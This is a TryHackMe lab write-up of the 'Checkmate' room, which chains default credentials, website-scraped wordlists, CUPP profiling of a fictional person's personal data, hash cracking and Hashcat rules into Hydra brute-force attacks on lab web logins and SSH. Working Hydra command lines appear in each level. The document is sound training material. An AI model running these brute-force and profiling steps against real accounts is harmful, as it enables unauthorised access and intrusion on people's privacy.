# 🛡️ Checkmate — TryHackMe Writeup

**Category:** Cracking / Authentication Attacks
**Room:** [tryhackme.com/room/checkmate](https://tryhackme.com/room/checkmate)
**Author:** Djaystar
**Date:** September 2026

## Overview

This room builds an authentication attack chain against four linked services belonging to the same fictional sysadmin, **Marco Bianchi**. Each service requires a different approach, and information gathered in one step keeps improving the wordlist for the next:

`Default credentials → OSINT profiling → Custom wordlists → Hash cracking → SSH brute-force`

| Level | Service | Technique | Result |
|---|---|---|---|
| 1 | Firewall Console (`:5001`) | Default credentials + Hydra | `admin:12345` |
| 2 | Employee Portal (`:5002`) | Website scraping → custom wordlist | `marco:excellence` |
| 3 | Social Platform (`:5003`) | OSINT profiling with CUPP | `marco:Bianchi2495` |
| 4 | Hash in image | SHA256 extraction + cracking | `family` |
| 5 | SSH (`:22`) | Wordlist + Hashcat rules | `marco:Security2024!` |

---

## Level 1 — The Firewall Console

**Goal:** gain access to the central firewall console at `firewall.thm:5001`.

1. Added a DNS mapping via `sudo nano /etc/hosts` → pointed `firewall.thm` to `10.112.136.92`.
2. Inspected the page source (`Ctrl+U`): the login form sends a POST request to `/login` with the parameters `username` and `password`.
3. Ran a brute-force attack with Hydra against `rockyou.txt`:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt firewall.thm -s 5001 \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials." -t 16
```

**Result:** `admin:12345`

**Takeaway:** the console was still running on default credentials and acted as the entry point into the rest of the network — a classic example of why default passwords should never remain in production.

---

## Level 2 — Employee Login Portal

**Goal:** log in to the internal portal at `jobs.thm:5002`.

1. A hint on the page indicated that user `marco` uses company-related terms as his password.
2. Form inspection confirmed the same POST structure to `/login`.
3. First tested with a small, manually built list (`company_passwords.txt`); then generated a broader list by scraping the website content:

```bash
curl -s http://jobs.thm:5002 | sed 's/<[^>]*>/ /g' | tr -cs '[:alnum:]' '\n' \
  | awk 'length >= 4' | sort -u > /tmp/cewl_passwords.txt
```

4. Brute-forced with Hydra against the scraped list:

```bash
hydra -l marco -P /tmp/cewl_passwords.txt jobs.thm -s 5002 \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Sign in" -t 6
```

**Result:** `marco:excellence`

**Profile gathered:** Marco Bianchi, IT Operations, born 14-02-1995, nickname "marky" — this data forms the basis for Level 3.

---

## Level 3 — Social Platform (OSINT)

**Goal:** turn Marco's personal information into a password on `social.thm:5003`.

1. Used **CUPP** (Common User Passwords Profiler) to generate a targeted wordlist based on Marco's PII (name, date of birth, nickname).
2. Brute-forced with Hydra against the generated list:

```bash
hydra -l marco -P marco.txt social.thm -s 5003 \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials." -t 4
```

**Result:** `marco:Bianchi2495` — a combination of surname and birth year, and a good example of how predictably people build passwords out of personal information.

---

## Level 4 — The Hash Crack (SHA256)

**Goal:** extract a SHA256 hash from a PNG file and crack it to plaintext.

1. Extracted the hash from the image.
2. Cracked the hash via CrackStation / Hashcat.

**Result:** `family`

---

## Level 5 — The Final SSH Crack

**Goal:** gain direct shell access via SSH (port 22).

1. Built a broader wordlist (`company_words.txt`) using the same scraping approach as Level 2.
2. Mutated the list with **Hashcat rules** (`marco.rule`) to generate realistic variants (capitalization, digits, special characters) → `marco_ssh.txt`.
3. Brute-forced with Hydra against SSH:

```bash
hydra -l marco -P /tmp/marco_ssh.txt 10.114.190.8 ssh -t 4
```

**Result:** `marco:Security2024!`

---

## 📚 Tooling & Concepts

| Tool / Concept | How it works | Use in this room |
|---|---|---|
| **CUPP** | Turns PII (name, date, partner, etc.) into a targeted wordlist via interactive questions. | Generated the wordlist for Level 3 based on Marco's profile. |
| **CeWL-style scraper** | Bash one-liner that scrapes words from a website, strips HTML tags, and keeps unique tokens (≥ 4 characters). | Turned the website content from port 5002 into a usable wordlist for Level 2. |
| **Hydra** | Network brute-forcer that tests HTTP POST forms and other protocols (SSH, FTP, ...) against a wordlist, based on a failure string. | Primary tool in almost every level for testing username/password combinations. |
| **Hashcat rules** | Rules that define how a word mutates (e.g. capitalize the first letter, append a digit at the end). | Turned simple words into realistic passwords like `Security2024!`. |
| **wc** | Linux utility for counting lines in a file without opening it fully. | Verified the size of the scraped wordlist. |

---

## Reflection

This room shows how weak authentication compounds: a default password on one service leads to information that makes the attack on the next service easier. It highlights the importance of strong, unique passwords per service, avoiding predictable patterns (name + birth year), and limiting how much personal information is publicly available.

---

*This writeup was structured and formatted with the help of AI, based on my own test results and notes. My original, raw documentation and notes are kept in Obsidian — feel free to reach out if you'd like to see them or are interested in collaborating.*
